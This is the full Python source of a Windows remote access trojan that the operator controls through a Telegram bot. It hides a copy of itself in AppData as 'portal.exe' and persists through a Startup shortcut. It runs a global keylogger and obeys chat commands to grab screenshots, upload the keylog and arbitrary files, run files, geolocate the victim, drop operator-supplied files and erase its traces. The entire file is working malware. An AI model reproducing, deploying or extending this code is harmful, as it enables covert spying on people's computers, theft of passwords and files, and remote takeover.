#!/usr/bin/env python
from PIL import ImageGrab
from time import strftime, sleep
from shutil import copyfile, copyfileobj, rmtree
from sys import argv, path
from json import loads
from winshell import startup
from tendo import singleton
from win32com.client import Dispatch
import telepot, requests
import os, os.path, platform, ctypes
import pyHook, pythoncom
me = singleton.SingleInstance()
# REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
#token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
token = os.environ['RAT_TOKEN'] # you can set your environment variable as well
# ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
known_ids = []
known_ids.append(os.environ['TELEGRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
def checkchat_id(chat_id):
	# COMMENT THE LINE below if you want this to work just for your telegram id!
	#return True
	try:
		return str(chat_id) in known_ids
	except:
		return str(chat_id) == known_ids
if (argv[0]).endswith('.exe'):
	appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
	# HIDING OPTIONS
	# ---------------------------------------------
	hide_folder = appdata_roaming_folder + r'\Portal'	# = 'C:\Users\Username\AppData\Roaming\Portal'
	compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
	# ---------------------------------------------
	target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
	if not os.path.exists(hide_folder):
		os.makedirs(hide_folder)
		hide_compiled = hide_folder + '\\' + compiled_name
		copyfile(argv[0], hide_compiled)
		shell = Dispatch('WScript.Shell')
		shortcut = shell.CreateShortCut(target_shortcut)
		shortcut.Targetpath = hide_compiled
		shortcut.WorkingDirectory = hide_folder
		shortcut.save()
else:
	hide_folder = path[0] + '\\RATAttack'
	if not os.path.exists(hide_folder):
		os.makedirs(hide_folder)
initi = False
user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
log_file = hide_folder + '\\keylogs.txt'
with open(log_file, "a") as writing:
	writing.write("-------------------------------------------------\n")
	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
def pressed_chars(event):
	if event and type(event.Ascii) == int:
		f = open(log_file,"a")
		str = ''
		if event.Ascii == 8:
			str += "<BS>"
		elif event.Ascii == 9:
			str += "<TAB>"
		elif event.Ascii == 13:
			str += "<ENTER>\n"
		elif event.Ascii == 27:
			str += "<ESC>"
		else:
			str += chr(event.Ascii)
		print str
		if str.find('\x00') == -1:
			f.write(str)
	return True
def handle(msg):
	chat_id = msg['chat']['id']
	print 'Got message from ' + str(chat_id) + ': ' + msg['text']
	if checkchat_id(chat_id):
		functionalities = ['/capture_pc', '/cd', '/pwd', '/to', '/play', '/keylogs', '/pc_info', '/msg_box', '/ip_info', '/download', '/ls', '/run_file', '/self_destruct'] # turn into dictionary?
		if 'text' in msg:
			command = msg['text']
			response = ''
			print command
			if command == '/capture_pc':
				bot.sendChatAction(chat_id, 'typing')
				screenshot = ImageGrab.grab()
				screenshot.save('screenshot.jpg')
				bot.sendChatAction(chat_id, 'upload_photo')
				bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
				os.remove('screenshot.jpg')
			elif command.startswith('/cd'):
				command = command.replace('/cd ','')
				try:
					os.chdir(command)
					response = os.getcwd() + '>'
				except:
					response = 'No subfolder matching ' + command
			elif command == '/pwd':
				response = os.getcwd()
			elif command.startswith('/to'):
				command = command.replace('/to','')
				if command == '':
					response = '/to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Hello HOME-PC and WORK-PC'
				else:
					targets = command[:command.index('/')]
					if platform.uname()[1] in targets:
						command = command.replace(targets, '')
						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
						handle(msg)
			elif command.startswith('/play'):
				command = command.replace('/play ', '')
				systemCommand = 'start \"\" \"https://www.youtube.com/embed/'
				systemCommand += command
				systemCommand += '?autoplay=1&showinfo=0&controls=0\"'
				if os.system(systemCommand) == 0:
					response = 'YouTube video is now playing'
				else:
					response = 'Failed playing YouTube video'
			elif command == '/keylogs':
				bot.sendChatAction(chat_id, 'upload_document')
				bot.sendDocument(chat_id, open(log_file, "rb"))
			elif command == '/pc_info':
				bot.sendChatAction(chat_id, 'typing')
				info = ''
				for pc_info in platform.uname():
					info += '\n' + pc_info
				response = info
			elif command.startswith('/msg_box'):
				message = command.replace('/msg_box', '')
				if message == '':
					response = '/msg_box yourText'
				else:
					ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
					response = 'MsgBox Displayed'
			elif command == '/ip_info':
				bot.sendChatAction(chat_id, 'find_location')
				info = requests.get('http://ipinfo.io').text
				response = info
				location = (loads(info)['loc']).split(',')
				bot.sendLocation(chat_id, location[0], location[1])
			elif command.startswith('/download'):
				bot.sendChatAction(chat_id, 'typing')
				path_file = command.replace('/download', '')
				path_file = path_file[1:]
				if path_file == '':
					# bot.sendChatAction(chat_id, 'typing')
					response = '/download C:/path/to/file.name or /download file.name'
				else:
					try:
						bot.sendChatAction(chat_id, 'upload_document')
						bot.sendDocument(chat_id, open(path_file, 'rb'))
					except:
						response = 'Could not find ' + path_file
			elif command == '/ls':
				bot.sendChatAction(chat_id, 'typing')
				files = os.listdir(os.getcwd())
				human_readable = ''
				for file in files:
					human_readable += file + '\n'
				human_readable += human_readable + '\n'
				response = human_readable
			elif command.startswith('/run_file'):
				bot.sendChatAction(chat_id, 'typing')
				path_file = command.replace('/run_file', '')
				path_file = path_file[1:]
				if path_file == '':
					response = '/run_file C:/path/to/file'
				else:
					os.startfile(path_file)
					response = 'Command executed'
			elif command == '/self_destruct':
				bot.sendChatAction(chat_id, 'typing')
				global initi
				initi = True
				response = 'You sure? Type \'destroy!\' to proceed.'
			elif command == 'destroy!' and initi == True:
				bot.sendChatAction(chat_id, 'typing')
				response = 'Destroying all traces!'
				if os.path.exists(hide_folder):
					for file in os.listdir(hide_folder):
						try:
							os.remove(hide_folder + '\\' + file)
						except:
							pass
				if os.path.isfile(target_shortcut):
					os.remove(target_shortcut)
				while True:
					sleep(10)
			elif command == '/help':
				response = "\n".join(str(x) for x in functionalities)
			else: # redirect to /help
				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
				handle(msg)
			if response != '':
				bot.sendMessage(chat_id, response)
		else:# Upload a file to target
			file_name = msg['document']['file_name']
			file_id = msg['document']['file_id']
			file_path = bot.getFile(file_id=file_id)['file_path']
			link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
			file = (requests.get(link, stream=True)).raw
			with open(hide_folder + '\\' + file_name, 'wb') as out_file:
				copyfileobj(file, out_file)
			response = 'File received succesfully.'
bot = telepot.Bot(token)
bot.message_loop(handle)
if len(known_ids) > 0:
	bot.sendMessage(known_ids[0], platform.uname()[1] + ": I'm up.")
#print 'Listening for commands on ' + platform.uname()[1] + '...'
proc = pyHook.HookManager()
try:
	proc.KeyDown = pressed_chars
except:
	sys.exit(0)
proc.HookKeyboard()
try:
	while True:
		pythoncom.PumpMessages()
except KeyboardInterrupt:
	exit(0)